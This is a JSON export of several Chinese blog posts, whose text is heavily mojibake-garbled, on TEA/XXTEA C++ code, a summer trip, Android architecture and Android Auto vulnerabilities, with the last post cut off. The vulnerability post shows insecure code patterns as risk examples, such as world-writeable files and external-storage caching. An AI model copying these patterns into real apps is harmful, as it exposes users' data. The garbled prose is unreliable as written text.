[{"content":"èƒŒæ™¯ä¸ç®€ä»‹ **TEA **ï¼šWheeler ä¸ Needham æå‡ºçš„ä¸€ç§æç®€åˆ†ç»„å¯†ç ã€‚ä¼˜ç‚¹æ˜¯å®ç°éå¸¸ç®€å•ã€é€Ÿåº¦å¿«ã€ä»£ç ä½“ç§¯å°ï¼›ç¼ºç‚¹æ˜¯å­˜åœ¨å¼±å¯†é’¥é—®é¢˜ï¼Œä¸å»ºè®®åœ¨é«˜å¼ºåº¦å®‰å…¨åœºæ™¯ä½¿ç”¨ã€‚\nåˆ†ç»„ï¼š64-bitï¼ˆä¸¤ä¸ª uint32_tï¼‰ å¯†é’¥ï¼š128-bitï¼ˆå››ä¸ª uint32_tï¼‰ å»ºè®®è½®æ•°ï¼š32æ¬¡å¾ªç¯ï¼ˆå¯¹åº” 64 è½® Feistel æ­¥ï¼‰ å¸¸æ•°ï¼šdelta = 0x9E3779B9ï¼ˆå–è‡ªé»„é‡‘åˆ†å‰²ï¼‰ XXTEA ï¼šä¸ºä¿®æ­£ Block TEA çš„ç¼ºé™·è€Œæå‡ºçš„æ”¹è¿›ç®—æ³•ã€‚é€‚åˆä»»æ„é•¿åº¦çš„ 32-bit æ•´æ•°æ•°ç»„ã€‚\næ•°æ®ï¼šn ä¸ª 32-bit æ•´æ•°ï¼ˆn \u0026gt;= 2ï¼‰ å¯†é’¥ï¼šåŒæ · 128-bit è½®æ•°ï¼š6 + 52 / n ä»ç„¶åªä½¿ç”¨ç§»ä½ã€å¼‚æˆ–ã€åŠ æ³•ç­‰éå¸¸é«˜æ•ˆçš„æ“ä½œ å®ç°è¦ç‚¹ä¸æ³¨æ„ æ•´æ•°å®½åº¦ä¸æº¢å‡ºï¼šä¸¤è€…éƒ½ä¾èµ– 32 ä½æ— ç¬¦å·æ•´æ•°çš„â€œç¯â€è¿ç®—ï¼ˆæ¨¡ 2**32ï¼‰ã€‚C++ çš„ uint32_t è‡ªå¸¦æ— ç¬¦å·æº¢å‡ºè¯­ä¹‰ï¼ˆè‡ªåŠ¨æŒ‰ 32 ä½æˆªæ–­ï¼‰ï¼Œæ— éœ€åƒpyä¸€æ ·æ‰‹åŠ¨ \u0026amp; 0xFFFFFFFFã€‚ ç«¯åºï¼šç¤ºä¾‹å®ç°ä¸­çš„æ‰“åŒ…/æ‹†åŒ…å‡½æ•°å›ºå®šä½¿ç”¨å°ç«¯ï¼ˆå€’åºï¼Ÿï¼‰æ ¼å¼ï¼Œä¿è¯è·¨å¹³å°ä¸€è‡´ã€‚ TEA ï¼ˆ64-bit åˆ†ç»„ï¼‰ è¿™é‡Œå…ˆç»™å‡ºç®€å•çš„å®ç°ï¼Œå®é™…ä¸Šåšé¢˜æˆ–è€…ç”Ÿäº§æ˜¯éœ€è¦å˜ç§çš„ï¼Œæœ¬äººç›®å‰æ°´å¹³å¤ªè‡­ï¼ˆï¼Œå°±æ”¾è‡ªå·±ä¼šçš„äº†ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026lt;cstdint\u0026gt; #include \u0026lt;array\u0026gt; namespace tea { static constexpr uint32_t DELTA = 0x9E3779B9u; // key: 4Ã—uint32_t using Key128 = std::array\u0026lt;uint32_t, 4\u0026gt;; // åŠ å¯†ä¸€ä¸ª 64-bit å—ï¼ˆv0,v1ï¼‰ inline void encrypt_block(uint32_t \u0026amp;v0, uint32_t \u0026amp;v1, const Key128 \u0026amp;k, uint32_t rounds = 32) { uint32_t sum = 0; for (uint32_t i = 0; i \u0026lt; rounds; ++i) { sum += DELTA; v0 += ((v1 \u0026lt;\u0026lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k[1]); v1 += ((v0 \u0026lt;\u0026lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k[3]); } } inline void decrypt_block(uint32_t \u0026amp;v0, uint32_t \u0026amp;v1, const Key128 \u0026amp;k, uint32_t rounds = 32) { uint32_t sum = DELTA * rounds; for (uint32_t i = 0; i \u0026lt; rounds; ++i) { v1 -= ((v0 \u0026lt;\u0026lt; 4) + k[2]) ^ (v0 + sum) ^ ((v0 \u0026gt;\u0026gt; 5) + k[3]); v0 -= ((v1 \u0026lt;\u0026lt; 4) + k[0]) ^ (v1 + sum) ^ ((v1 \u0026gt;\u0026gt; 5) + k[1]); sum -= DELTA; } } } // namespace tea XXTEAï¼ˆä»»æ„é•¿åº¦ 32-bit æ•°ç»„ï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 #include \u0026lt;cstdint\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;array\u0026gt; namespace xxtea { using Key128 = std::array\u0026lt;uint32_t, 4\u0026gt;; static constexpr uint32_t DELTA = 0x9E3779B9u; // ç»å…¸å¸¸æ•° // v: n ä¸ª uint32_tï¼Œn\u0026gt;=2 inline void encrypt(std::vector\u0026lt;uint32_t\u0026gt; \u0026amp;v, const Key128 \u0026amp;k) { const size_t n = v.size(); if (n \u0026lt; 2) return; uint32_t rounds = 6u + static_cast\u0026lt;uint32_t\u0026gt;(52u / n); uint32_t sum = 0; uint32_t z = v[n - 1], y; while (rounds--) { sum += DELTA; uint32_t e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3u; for (size_t p = 0; p \u0026lt; n - 1; ++p) { y = v[p + 1]; v[p] += (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[(p ^ e) \u0026amp; 3] ^ z)); z = v[p]; } y = v[0]; v[n - 1] += (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[((n - 1) ^ e) \u0026amp; 3] ^ z)); z = v[n - 1]; } } inline void decrypt(std::vector\u0026lt;uint32_t\u0026gt; \u0026amp;v, const Key128 \u0026amp;k) { const size_t n = v.size(); if (n \u0026lt; 2) return; uint32_t rounds = 6u + static_cast\u0026lt;uint32_t\u0026gt;(52u / n); uint32_t sum = rounds * DELTA; uint32_t z, y = v[0]; while (rounds--) { uint32_t e = (sum \u0026gt;\u0026gt; 2) \u0026amp; 3u; for (size_t p = n - 1; p \u0026gt; 0; --p) { z = v[p - 1]; v[p] -= (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[(p ^ e) \u0026amp; 3] ^ z)); y = v[p]; } z = v[n - 1]; v[0] -= (((z \u0026gt;\u0026gt; 5) ^ (y \u0026lt;\u0026lt; 2)) + ((y \u0026gt;\u0026gt; 3) ^ (z \u0026lt;\u0026lt; 4))) ^ ((sum ^ y) + (k[(0 ^ e) \u0026amp; 3] ^ z)); y = v[0]; sum -= DELTA; } } } // namespace xxtea å®é™…ä¸Šå’Œteaä¸€æ ·ï¼Œxxteaçš„è§£å¯†â‰ˆ åŠ å¯†çš„å€’åºï¼ˆä¸»è¦å¾—ç›Šäºå¼‚æˆ–çš„æ€§è´¨ï¼‰ï¼š\nè½®æ¬¡é¡ºåºï¼šè§£å¯†è¦ä»æœ€åä¸€è½®å¾€å›èµ°ï¼›\nè¿ç®—ç¬¦å·ï¼šåŠ å¯†æ—¶åŠ ä¸Šå»çš„é‡ï¼Œè§£å¯†å°±å‡æ‰ï¼›\nçŠ¶æ€ä¾èµ–ï¼šç”±äºæ¯ä¸€è½®ç»“æœä¾èµ–å‰ä¸€è½®ï¼Œå¿…é¡»ä¸¥æ ¼é€†åºæ‰èƒ½è¿˜åŸã€‚\néœ€è¦æ³¨æ„çš„æ˜¯xxteaå¾ªç¯ä¹‹åè¿˜æœ‰ä¸€æ­¥çš„å•ç‹¬å¤„ç†ï¼ŒåŸå› æ˜¯XXTEA çš„è®¾è®¡æ˜¯ä¸€ä¸ª\u0026quot;ç¯å½¢æ•°ç»„\u0026quot;è¿ç®—,æ‰€ä»¥è¦é¢å¤–å¤„ç†é¦–å°¾ä¸€æ¬¡ã€‚\nå°ç»“ TEA ä¸ XXTEA éƒ½ä»¥â€œç§»ä½ + å¼‚æˆ– + åŠ æ³•â€ä¸ºæ ¸å¿ƒï¼Œæ˜“å®ç°ä¸”æ€§èƒ½ä½³ã€‚ TEA é¢å‘ 64-bit åˆ†ç»„ï¼›XXTEA ç›´æ¥é¢å‘ 32-bit æ•°ç»„ï¼Œé€‚åˆä»»æ„é•¿åº¦ã€‚ ","date":"2025-09-13T00:00:00Z","image":"https://example.com/p/tea-%E4%B8%8E-xxtea/20180629201629_nn8NF_hu_aa1a239ff0a51663.gif","permalink":"https://example.com/p/tea-%E4%B8%8E-xxtea/","title":"TEA ä¸ XXTEA"},{"content":"æš‘å‡ç¬¬ä¸€ç«™â€”â€”è‹å· æ¬å®Œæ ¡åŒºå›æ¥å°±å·²ç»ä¸ƒæœˆåå¤šå·äº†ï¼Œçº¦å®šçš„è‹å·è¡Œæœ¬æ¥æƒ³å»¶åï¼Œä½†æ˜¯æœ‰äº†ä¸Šæ¬¡æ³¡æ±¤æ—…è¡Œçš„æ•™è®­ï¼Œè¿˜æ˜¯è¯´èµ°å°±èµ°å§ã€‚\nå»è‹å·çš„è·¯ä¸Š\nå§‘è‹åŸå¤–å¯’å±±å¯º\nç•™å›­äººè¿¹ç¨€å°‘çš„è§’è½\né‡‘é¸¡æ¹–çš„å¤œæ™¯\nè€å®è¯´ï¼Œæš‘å‡å»è‹å·ä¸æ˜¯ä¸€ä¸ªæ˜æ™ºçš„é€‰æ‹©ï¼Œåˆ°å¤„éƒ½æ˜¯äººï¼Œä½“éªŒæ„Ÿä¸ç®—å¾ˆå¥½ã€‚ä½†æ˜¯æ€»ä½“æ¥è¯´è‹å·è¡Œè¿˜æ˜¯ä¸é”™çš„ï¼Œæ˜¯æƒ³å»ç¬¬äºŒå›çš„åŸå¸‚ã€‚\næˆ–è®¸ä»¥ååœ¨è‹å·ä¸Šç­ä¹Ÿä¸é”™ï¼Ÿï¼ˆ\næš‘å‡ç¬¬äºŒç«™â€”â€”ä¸œé˜³ åœ¨ä¸œé˜³çš„æ—¥å­æ¯”è¾ƒå¹³æ·¡ï¼Œä¸€å¤©å°±æ˜¯åšåšå¤§åˆ›å’Œå¥èº«ï¼Œä¸è¿‡å¼€è½¦è¿˜æ˜¯å¾ˆèˆ’æœçš„ã€‚\nï¼ˆéƒ½æ˜¯æœ‹å‹åœˆçš„ä¸œè¥¿-ã€‚-\nä¸ªäººæ¥è¯´ï¼Œä¸œé˜³çš„æ—¥å­æˆ–è®¸æ²¡é‚£ä¹ˆç²¾å½©ï¼Œä½†æ˜¯ä¼šæœ‰ç§æ²‰æ·€çš„æ„Ÿè§‰ï¼Œä¹Ÿèƒ½åœ¨å¹³æ·¡çš„æ—¥å­é‡ŒæŠŠæ¡ä¸€äº›å°ç¡®å¹¸ï¼Œè¿™æ­£æ˜¯æˆ‘æ‰€è¿½æ±‚çš„ã€‚\næš‘å‡ç¬¬ä¸‰ç«™â€”â€”ä¹‰ä¹Œ ä¹‰ä¹Œå’Œè‹å·ä¸€æ ·éƒ½æ˜¯ç©äº†ä¸‰å¤©ä¸¤å¤œï¼Œä¸è¿‡åè€…ä¸å¤Ÿç©ï¼Œå‰è€…ä¸å¤Ÿå¥½ç©ã€‚\nå¾ˆéš¾è¯„ï¼Œå°±å½“æ˜¯æ¼‚äº®é¥­å§ åœ¨å°å•†å“åŸé€›äº†åŠå¤©ï¼Œå•¥ä¹Ÿæ²¡ä¹°ï¼Œå°±å½“å‚è§‚äº†\nåœ¨éŸ©å›½é£æƒ…è¡—åƒçš„ç«é”…ï¼Œåº”è¯¥ç®—å›½å†…æ¯”è¾ƒæ­£å®—çš„äº†\nä¹‰ä¹Œè¿˜æ˜¯å¤ªå•†ä¸šäº†ï¼Œä¸å¤ªé€‚åˆæˆ‘ä»¬è¿™ç§å­¦ç”Ÿï¼Œä»¥ååº”è¯¥ä¸ä¼šæƒ³å»äº†ã€‚\næš‘å‡ç¬¬å››ç«™â€”â€”å®æµ· å›å®æµ·çš„æ—¥å­å°±æ˜¯äº«å—å‡æœŸäº†ï¼Œç™½å¤©åƒå–ç©ä¹ï¼Œæ™šä¸Šç½‘å§å¼€é»‘ï¼Œå¾—ç›Šäºå¤§åˆ›åœæ»äº†ä¸€æ®µæ—¶é—´å§ï¼Œè®©æˆ‘æœ‰ç©ºæ‘¸ğŸŸã€‚ ååˆ†æƒ³å¿µçš„äº‘å—èŒå­ç«é”…\nå’Œé«˜ä¸­åŒå­¦çœ‹è€å¸ˆä¸­åˆèšä¼šåƒçš„ç”²é±¼ç…²\nè¶…ç»é€ å‹å®¤\nä¸¤ä¸ªåªæœ‰çœ‹ç”µè§†æ‰ä¼šå®‰é™ä¸‹æ¥çš„å°å®¶ä¼™\næ€»æ˜¯è§‰å¾—å®æµ·å¤ªæ— èŠäº†ï¼Œæˆ–è®¸æ˜¯å¹´è½»çš„å¿ƒä¸æƒ³åœ¨å°å¿åŸèœ—å±…å§ã€‚\nå®‰æŠšå½’ä¹¡çš„å¿ƒåï¼Œéœ€è¦å¼€å§‹æ–°çš„å†ç¨‹äº†ã€‚\næš‘å‡ç¬¬äº”ç«™â€”â€”ä¹æ¸… å»çœ‹å¥¶å¥¶ï¼Œå‘†çš„æ—¶é—´å¾ˆçŸ­ã€‚\nå¯¹ä¹æ¸…æœ€å¤§çš„å°è±¡å°±æ˜¯å¼€éçš„ä¹¦è‹‘ï¼Œè¿™æ˜¯ä¸€åº§é˜…è¯»æœ‰æ¸©åº¦çš„åŸå¸‚\næš‘å‡ç»ˆç‚¹ç«™â€”â€”æ·±åœ³ æå‰ä¸€å‘¨å›åˆ°ä¸­æ·±ï¼Œæ”¶æ‹¾ä¸€ä¸‹ï¼Œå°±è¦å¼€å¯æ–°çš„ç”Ÿæ´»äº†ã€‚\næ¡Œé¢åˆé˜¶æ®µ\næ˜¯æš‘å‡çš„ç»ˆç‚¹ï¼Œä¹Ÿæ˜¯å¤§äºŒçš„èµ·ç‚¹ï¼ŒæœŸå¾…æ¥ä¸‹æ¥ä¸‰å¹´çš„ç”Ÿæ´»ã€‚\næœ€åçš„æœ€åï¼Œä»Šå¹´å·²ç»è¿‡å»ä¸‰åˆ†ä¹‹äºŒäº†ï¼Œå¯¹è‡ªå·±æ¥ä¸‹æ¥åº”è¯¥æœ‰æ‰€å±•æœ›ï¼Œå¸Œæœ›ä½ ï¼š\nè®¤çœŸå­¦ä¹ ï¼Œé€æ­¥ç²¾é€šre\nä¿æŒçƒ­çˆ±ï¼ŒåšæŒå¥èº«å’Œæœ‰æ°§\nè§„å¾‹ç”Ÿæ´»ï¼Œå‡å°‘ç†¬å¤œ\nå‘å¤–ç¤¾äº¤ï¼Œç»“è¯†å„ç§å„æ ·çš„æœ‹å‹ï¼ˆç»å¯¹ä¸æ˜¯å› ä¸ºxyyæƒ³è°ˆæ‹çˆ±ï¼Œç»å¯¹ï¼ç»å¯¹ï¼Ÿï¼‰\noverã€‚\næ„Ÿè°¢ä¸€ç›´ä»¥æ¥æ²¡æœ‰æ”¾å¼ƒçš„ä½ \n","date":"2025-09-05T00:00:00Z","image":"https://example.com/p/%E6%9A%91%E6%9C%9F%E5%B0%8F%E7%BB%93/1_hu_c12164ec0ae9506b.jpg","permalink":"https://example.com/p/%E6%9A%91%E6%9C%9F%E5%B0%8F%E7%BB%93/","title":"æš‘æœŸå°ç»“"},{"content":"Androidçš„ç³»ç»Ÿæ¶æ„ Androidç³»ç»Ÿåˆ†ä¸º5å±‚ï¼Œä»é«˜åˆ°ä½åˆ†åˆ«æ˜¯åº”ç”¨å±‚ã€åº”ç”¨æ¡†æ¶å±‚ã€ç³»ç»Ÿè¿è¡Œåº“å±‚ã€ç¡¬ä»¶æŠ½è±¡å±‚å’ŒLinuxå†…æ ¸å±‚ã€‚å¦‚å›¾ï¼š åº”ç”¨å±‚ï¼ˆApplicationsï¼‰â€‹ ç”¨æˆ·ç›´æ¥äº¤äº’çš„ç•Œé¢ï¼ŒåŒ…å«ç³»ç»Ÿé¢„è£…åº”ç”¨ï¼ˆå¦‚ç”µè¯ã€çŸ­ä¿¡ã€æµè§ˆå™¨ï¼‰å’Œç¬¬ä¸‰æ–¹åº”ç”¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ç›´æ¥æ¥è§¦çš„ç•Œé¢ã€‚\nåº”ç”¨æ¡†æ¶å±‚ï¼ˆApplication Frameworkï¼‰â€‹ ä¸ºå¼€å‘è€…æä¾›APIæ¥å£å’Œæ ¸å¿ƒæœåŠ¡ã€‚Android 4å¤§ç»„ä»¶ï¼Œ6å¤§å¸ƒå±€ï¼Œapiçš„å®šä¹‰ï¼Œviewç­‰ç³»ç»Ÿå®šä¹‰çš„åŸç”Ÿç»„ä»¶éƒ½åœ¨è¿™å±‚ã€‚\nç³»ç»Ÿè¿è¡Œåº“å±‚ï¼ˆLibraries + Android Runtimeï¼‰â€‹ åŸç”ŸC/C++åº“â€‹ æä¾›åº•å±‚åŠŸèƒ½æ”¯æŒï¼Œå¦‚å›¾ï¼š Android Runtime (ART) é‡‡ç”¨AOTï¼ˆæå‰ç¼–è¯‘ï¼‰æ›¿ä»£Dalvikçš„JITï¼ˆå³æ—¶ç¼–è¯‘ï¼‰ï¼Œæå‡è¿è¡Œæ•ˆç‡ã€‚ç®¡ç†åº”ç”¨è¿›ç¨‹ã€å†…å­˜åˆ†é…åŠåƒåœ¾å›æ”¶ã€‚\nä¸ Dalvik å¯¹æ¯”ï¼š ç¡¬ä»¶æŠ½è±¡å±‚ï¼ˆHAL, Hardware Abstraction Layerï¼‰â€‹ ç¡¬ä»¶æŠ½è±¡å±‚ (HAL) æä¾›æ ‡å‡†ç•Œé¢ï¼Œå‘æ›´é«˜çº§åˆ«çš„ Java API æ¡†æ¶æ˜¾ç¤ºè®¾å¤‡ç¡¬ä»¶åŠŸèƒ½ã€‚HAL åŒ…å«å¤šä¸ªåº“æ¨¡å—ï¼Œå…¶ä¸­æ¯ä¸ªæ¨¡å—éƒ½ä¸ºç‰¹å®šç±»å‹çš„ç¡¬ä»¶ç»„ä»¶å®ç°ä¸€ä¸ªç•Œé¢ã€‚å½“æ¡†æ¶ API è¦æ±‚è®¿é—®è®¾å¤‡ç¡¬ä»¶æ—¶ï¼ŒAndroid ç³»ç»Ÿå°†ä¸ºè¯¥ç¡¬ä»¶ç»„ä»¶åŠ è½½åº“æ¨¡å—ã€‚å‚å•†ä¼šåœ¨è¿™å±‚å®šä¹‰è‡ªå·±çš„HALæ¥å£ã€‚HALè¿è¡Œåœ¨ç”¨æˆ·ç©ºé—´(User Space )ï¼Œè¿™æ ·çš„ä¸€å±‚å°±æ˜¯ä¸“é—¨ä¸ºå„ä¸ªå‚å•†æœåŠ¡ï¼Œä¸ºå…¶è®¾è®¡è‡ªå·±çš„é£æ ¼ã€‚\nLinuxå†…æ ¸å±‚ï¼ˆLinux Kernelï¼‰â€‹ Androidæ ¸å¿ƒç³»ç»ŸæœåŠ¡ä¾èµ–äºLinuxå†…æ ¸ï¼ŒåŒ…æ‹¬å®‰å…¨æ€§ã€å†…å­˜ç®¡ç†ã€è¿›ç¨‹ç®¡ç†ã€ç½‘ç»œåè®®å’Œé©±åŠ¨æ¨¡å‹ç­‰ã€‚Linuxå†…æ ¸ä¹ŸåŒæ—¶ä½œä¸ºç¡¬ä»¶å’Œè½¯ä»¶æ ˆä¹‹é—´çš„æŠ½è±¡å±‚ã€‚\n","date":"2025-07-17T00:00:00Z","image":"https://example.com/p/%E5%88%9D%E8%AF%86android/duitang_1752738125020_hu_c09bcf3287179663.gif","permalink":"https://example.com/p/%E5%88%9D%E8%AF%86android/","title":"åˆè¯†Android"},{"content":"Android autoå¸¸è§æ¼æ´ å®‰å“æ±½è½¦ï¼ˆAndroid Autoï¼‰çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼ˆAPIï¼‰å…è®¸å¼€å‘è€…ä¸ä¿¡æ¯å¨±ä¹ç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚é€šå¸¸ï¼ŒAPI è®¾è®¡è€…ä¼šè€ƒè™‘ç‰¹å®šçš„åè®®æˆ– API è°ƒç”¨åºåˆ—ä»¥ç¡®ä¿ç³»ç»Ÿçš„å®‰å…¨æ€§å’Œå¯é æ€§ï¼Œè€Œæ”»å‡»è€…åˆ™å°†åˆ©ç”¨è¿™äº›APIè¿›è¡Œæ”»å‡»ã€‚\nå¤–éƒ¨æ–‡ä»¶è®¿é—®æ£€æµ‹ Androidçš„å¤–éƒ¨å­˜å‚¨ï¼ˆå¦‚SDå¡ï¼‰å¯¹æ‰€æœ‰åº”ç”¨å¼€æ”¾è¯»å†™æƒé™ï¼ˆé™¤éè®¾ç½®ç‰¹æ®ŠåŠ å¯†ï¼‰ï¼Œè¿™æ„å‘³ç€ï¼š\nä»»ä½•åº”ç”¨éƒ½å¯ä»¥è¯»å–ã€ä¿®æ”¹ã€åˆ é™¤å¤–éƒ¨å­˜å‚¨ä¸­çš„æ–‡ä»¶ã€‚\næ•æ„Ÿæ•°æ®ï¼ˆå¦‚ç”¨æˆ·éšç§ã€é…ç½®ä¿¡æ¯ã€ä¸šåŠ¡é€»è¾‘æ–‡ä»¶ï¼‰è‹¥å­˜å‚¨åœ¨å¤–éƒ¨å­˜å‚¨ï¼Œå¯èƒ½è¢«æ¶æ„åº”ç”¨ç¯¡æ”¹ã€çªƒå–æˆ–åˆ é™¤ï¼Œå¯¼è‡´æ•°æ®æ³„éœ²æˆ–åŠŸèƒ½å¼‚å¸¸ã€‚\nç¤ºä¾‹ï¼ˆgetDiskCacheDiræ–¹æ³•ï¼‰:\n1 2 3 4 5 public static File getDiskCacheDir(Context c) { File dir = c.getExternalCacheDir(); // å°è¯•è·å–å¤–éƒ¨ç¼“å­˜ç›®å½• if (dir == null) { dir = c.getCacheDir(); } // å¤–éƒ¨å­˜å‚¨ä¸å¯ç”¨æ—¶ï¼Œå›é€€åˆ°å†…éƒ¨ç¼“å­˜ return dir; } ä½¿ç”¨ WORLD_WRITEABLE å½“æ–‡ä»¶ä»¥ MODE_WORLD_WRITEABLE æ¨¡å¼åˆ›å»ºæ—¶ï¼Œå…¶ä»–åº”ç”¨ï¼ˆæ— è®ºæ˜¯å¦å±äºåŒä¸€å¼€å‘è€…ï¼‰å‡å¯å‘è¯¥æ–‡ä»¶å†™å…¥æ•°æ®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒAndroid ä¿æŠ¤æœºåˆ¶å¼ºåˆ¶æ‰§è¡Œï¼Œåªæœ‰åˆ›å»ºå†…éƒ¨å­˜å‚¨æ–‡ä»¶çš„åº”ç”¨æ‰èƒ½è®¿é—®å®ƒã€‚ä½†æ˜¯æœ‰äº›åº”ç”¨ç¡®å®ä½¿ç”¨MODE_WORLD_WRITEABLE æˆ– MODE_WORLD_READABLE æ¨¡å¼æ¥å¤„ç† IPC æ–‡ä»¶ï¼Œä»è€Œç»•è¿‡è¿™ä¸€é™åˆ¶ã€‚\nç¤ºä¾‹ï¼š\n1 2 3 4 5 File f = new File(getFilesDir(), \u0026#34;filename.ext\u0026#34;); f.delete(); FileOutputStream fos = openFileOutput(\u0026#34;filename.ext\u0026#34;, Context.MODE_WORLD_WRITEABLE); // ä»¥å…¨å±€å¯å†™æ¨¡å¼åˆ›å»ºåŒåæ–‡ä»¶ï¼ˆé«˜å±æ“ä½œï¼‰ fos.close(); File f = new File(getFilesDir(), \u0026#34;filename.ext\u0026#34;); å¯†é’¥åº“é£é™© å¯†é’¥å¯ä»¥å­˜æ”¾åœ¨å¯†é’¥åº“ä¸­ï¼Œå¹¶ä½¿ç”¨å¯†ç ä¿æŠ¤ã€‚ç„¶è€Œï¼Œè¿™å¹¶ä¸èƒ½ä¿æŠ¤åœ¨å·²é­ root æ”»å‡»çš„ç³»ç»Ÿä¸­è¢«ç›‘æ§ç”¨æˆ·è¾“å…¥å¯†ç æ—¶çš„æ•°æ®ã€‚\nâ€‹PasswordProtection()è¢«æ±¡æŸ“: æ”»å‡»è€…å¯ä»¥ä¿®æ”¹æ­¤æ„é€ å‡½æ•°çš„è¡Œä¸ºï¼Œä½¿å…¶æ¥å—ç©ºå¯†ç æˆ–ä»»æ„å¯†ç \nâ€‹getPrivateKey()è¢«æ±¡æŸ“: æ­¤æ–¹æ³•æœ¬åº”è¿”å›KeyStoreä¸­å­˜å‚¨çš„çœŸå®ç§é’¥ã€‚è‹¥è¢«æ±¡æŸ“ï¼Œå¯è¿”å›æ”»å‡»è€…æ§åˆ¶çš„ä¼ªé€ ç§é’¥\nâ€‹load()è¢«æ±¡æŸ“: è‹¥è¢«æ±¡æŸ“ï¼Œå¯åŠ è½½åŒ…å«æ¶æ„æ¡ç›®çš„å¯†é’¥åº“æˆ–åœ¨åŠ è½½è¿‡ç¨‹ä¸­çªƒå–å¯†ç \nå†…å®¹æä¾›è€… å†…å®¹æä¾›è€…æ˜¯Androidå››å¤§ç»„ä»¶ä¹‹ä¸€ï¼Œç”¨äºåœ¨ä¸åŒåº”ç”¨é—´å…±äº«æ•°æ®ï¼ˆå¦‚æ•°æ®åº“ã€æ–‡ä»¶ç­‰ï¼‰ï¼Œæ˜¯ä¸€ç§ç»“æ„åŒ–å­˜å‚¨æœºåˆ¶ã€‚å…¶é»˜è®¤è¡Œä¸ºç”±android:exportedå±æ€§æ§åˆ¶ï¼Œå†³å®šæ˜¯å¦å…è®¸å…¶ä»–åº”ç”¨è®¿é—®ã€‚ä½†æ˜¯åœ¨ä¸€äº›åœºæ™¯ä¸­ï¼Œè¯¥æƒé™å¯ä»¥è¢«åŠ¨æ€æ·»åŠ ï¼š\n1 2 3 4 5 6 7 PermissionInfo permissionInfo = new PermissionInfo(); permissionInfo.name = \u0026#34;com.example.plugin.MY_UNIQUE_PERMISSION\u0026#34;; // æƒé™å”¯ä¸€æ ‡è¯† permissionInfo.labelRes = R.string.permission_risk_warning; // æƒé™æè¿°ï¼ˆå¿…é¡»æ¸…æ™°å‘ŠçŸ¥é£é™©ï¼‰ permissionInfo.protectionLevel = PermissionInfo.PROTECTION_SIGNATURE; // ä¿æŠ¤çº§åˆ«è®¾ä¸ºç­¾åçº§ permissionInfo.description = \u0026#34;å…è®¸æ’ä»¶è®¿é—®å®¿ä¸»æ ¸å¿ƒåŠŸèƒ½ï¼Œä»…é™æˆæƒåº”ç”¨ä½¿ç”¨\u0026#34;; // è¯¦ç»†æè¿° PackageManager packageManager = getApplicationContext().getPackageManager(); packageManager.addPermission(permissionInfo) WebView WebView æ˜¯ Android/iOS ç­‰ç§»åŠ¨æ“ä½œç³»ç»Ÿä¸­å†…ç½®çš„æµè§ˆå™¨ç»„ä»¶ï¼Œå…è®¸åº”ç”¨å†…åµŒç½‘é¡µå†…å®¹ï¼Œå®ç°æ··åˆå¼€å‘ï¼ˆHybrid Appï¼‰ã€‚åœ¨ WebView ä¸­ï¼Œå¯ç”¨ JavaScript æ„å‘³ç€å®ƒç°åœ¨å®¹æ˜“å—åˆ° XSS æ”»å‡»ã€‚å¦‚æœä½¿ç”¨ï¼Œåˆ™åº”ä»…å‘æ‰€æœ‰è¾“å…¥éƒ½å€¼å¾—ä¿¡èµ–çš„ç½‘é¡µæš´éœ² addJavaScriptInterface()ã€‚\nGPS ä½ç½®æ£€æµ‹å™¨ WebChromeClient.onGeolocationPermissionsShowPrompt()æ–¹æ³•æ¥è·å–å‘ JavaScript æŠ«éœ²ç”¨æˆ·ä½ç½®çš„æƒé™ã€‚\nAndroid auto é™æ€åˆ†æå™¨ ä½¿ç”¨æŠ½è±¡è§£é‡Šæ¥åˆ†æå’ŒéªŒè¯Javaå­—èŠ‚ç \nç³»ç»Ÿæ¶æ„ å…·ä½“æµç¨‹ï¼š\n1.åº”ç”¨è·å–ä¸æ‹†è§£â€‹ï¼šæå–APKä¸­çš„ä»£ç ï¼ˆJARï¼‰å’Œé…ç½®æ–‡ä»¶ï¼ˆManifestï¼‰ã€‚\nâ€‹2.é€†å‘å·¥ç¨‹â€‹ï¼šåç¼–è¯‘ä»£ç ç”Ÿæˆç»“æ„åŒ–å­—èŠ‚ç ï¼Œè¿˜åŸåº”ç”¨é€»è¾‘ã€‚ â€‹\n3.é…ç½®åˆ†æâ€‹ï¼šè§£æManifestè·å–æƒé™ã€ç»„ä»¶ç­‰å®‰å…¨æ•æ„Ÿé…ç½®ã€‚ â€‹\n4.è‡ªåŠ¨åŒ–åˆ†æâ€‹ï¼š\nAndroid Auto Analyzeræç‚¼é…ç½®å±‚é£é™©ï¼ˆå¦‚è¿‡åº¦å£°æ˜çš„æƒé™ï¼‰ã€‚\næ±¡ç‚¹åˆ†æç»“åˆä»£ç é€»è¾‘ï¼Œè¿½è¸ªæ•æ„Ÿæ•°æ®åœ¨ç¨‹åºä¸­çš„æµåŠ¨è·¯å¾„ã€‚ â€‹\n5.æ¼æ´åˆ¤å®šâ€‹ï¼šé€šè¿‡ä¸¤è€…çš„åˆ†æç»“æœï¼Œè¯†åˆ«å¦‚â€œæƒé™æ»¥ç”¨+æ•°æ®æœªè„±æ•â€â€œç»„ä»¶æš´éœ²+æ•æ„Ÿæ“ä½œæ— æ 